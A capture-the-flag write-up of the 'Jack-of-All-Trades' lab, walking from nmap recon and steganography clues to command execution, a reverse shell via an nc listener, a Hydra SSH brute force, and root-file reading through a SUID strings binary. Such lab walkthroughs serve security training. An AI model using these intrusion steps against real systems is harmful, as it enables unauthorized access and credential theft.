# CTF Writeup: Jack-of-All-Trades

## Preparation

First thing I always do before approaching any CTF challenge is create a dedicated directory on my Kali machine to keep credentials, outputs, and clues organized:

```bash
mkdir ~/Desktop/thm/rooms/jack-of-all-trades
```

---

## Reconnaissance

After receiving the target's IP, I ran an **nmap** scan. Something unusual stood out (so unusual I ran the scan three times to be sure):

```bash
nmap -sC -sV -Pn {{TARGET-IP}}
```

_Output snippet:_

```

nmap -sC -sV -Pn {{TARGET-IP}}
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 01:02 IDT
Nmap scan report for 10.10.241.208
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.49 seconds
```

  
Turns out the HTTP server was running on **port 22**, while SSH was on **port 80**.  

---

## Accessing the Web Server

Trying to open port 22 in Firefox didn’t work, because modern browsers block uncommon ports for security reasons:

![Firefox Block](https://github.com/user-attachments/assets/0463e7a0-7f71-493e-8199-cc59f6dce3f6)

To bypass this, I adjusted Firefox settings:

- Go to `about:config`
- Search for `network.security.ports.banned.override`
- If missing, create it:  
  Right-click → New → String  
  Name: `network.security.ports.banned.override`  
  Value: `22`  
- Restart Firefox

After this, the page loaded successfully.

On the site, I noticed three interesting images: the **dinosaur**, the **toy**, and the **header**. I saved them locally for later inspection.

![Jack Website](https://github.com/user-attachments/assets/cd75051c-e0ef-4df1-8db5-70be89bd2005)

---

## Source Code Enumeration

Checking the page source (`Ctrl+U`), I found a hidden note with **Base64-encoded text** and a clue pointing to `/recovery.php`.

Decoding the hidden note gave:

> "Remember to wish Johnny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?-------"

So, I noted down:  
- Name: **Johnny Graves**  
- A password: `u?-------`  

Visiting `/recovery.php` revealed another hidden message, this time encoded in **Base32**.  

![Recovery Page Source](https://github.com/user-attachments/assets/f3c9bfa1-0f57-4eb8-8d31-283ec45eb5d0)

Decoding led to hexadecimal output, which after conversion looked like some rotation cipher. A quick Google search on Johnny Graves pointed to his MySpace page:

![Johnny MySpace](https://github.com/user-attachments/assets/30e6789b-f355-457b-bc66-3f5982dfd276)

Turns out Johnny loves using **ROT13 + Base32** for his messages. Applying this gave me a **bit.ly URL**, which redirected to the Wikipedia page for **Stegosauria**. I kept that keyword in mind.

---

## Steganography Fun

Time to inspect the images I saved earlier with **steghide**.

```bash
steghide --extract -sf stego.jpg
```

With the password from earlier, I extracted `creds.txt`:

![Creds Output](https://github.com/user-attachments/assets/a78866f0-313d-4d25-b6d9-99816ff18daf)

Repeating the process for `header.jpg` yielded `cms.creds`:

```
Username: jackinthebox
Password: Tp-------
```

Bingo!

---

## Exploitation

Using those creds, I logged into `/recovery.php`. The page allowed command execution through the URL parameter:

![Command Exec](https://github.com/user-attachments/assets/eeaf4ae7-38c1-4cb4-b341-5799d3d4b153)

Perfect — I now had RCE. Instead of just trying to read files, I went for a **reverse shell**.  

I generated one at [revshells.com](https://www.revshells.com/), started a listener with `nc -nlvp 4444`, and popped a shell:

```
whoami
www-data
```

Upgrading it with Python gave me an interactive shell.  

---

## Lateral Movement

Inside `/home`, I found **jack’s home folder** (no access) and a file called `jacks_password_list`. Jackpot!  

I copied it to my Kali machine and brute-forced SSH with **Hydra** (don’t forget SSH is on port 80!):

```bash
hydra -l jack -P wlist.txt ssh://10.10.234.46:80/
```

Hydra revealed Jack’s password. Now I could SSH as Jack:

```bash
ssh jack@10.10.234.46 -p80
```

Inside Jack’s home directory, I found the **user flag**, but in an unexpected format — an image file!  

I copied it back with SCP:

```bash
scp user.jpg kali@10.9.4.95:~/Desktop/thm/rooms/jack-of-all-trages/
```

And sure enough, the flag was embedded in the picture.

![User Flag](https://github.com/user-attachments/assets/7dd65d2c-9008-4d32-93d6-433def11978f)

---

## Privilege Escalation

To get root, I checked `sudo -l` (no luck), then searched for binaries with the SUID bit:

```bash
find / -type f -perm -4000 2>/dev/null
```

The list included **/usr/bin/strings**. Using it on `/root/root.txt` worked!  

```bash
strings /root/root.txt
```

_Output:_  

```
ToDo:
1.Get new penguin skin rug...
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body...
5.Remember to finish that contract for Lisa.
6.Delete this: sec*********_{****************************}
```

---

## Flags Obtained 🎉

- **User Flag** → Found in `user.jpg`  
- **Root Flag** → Extracted with `strings /root/root.txt`  

✅ Challenge Complete!
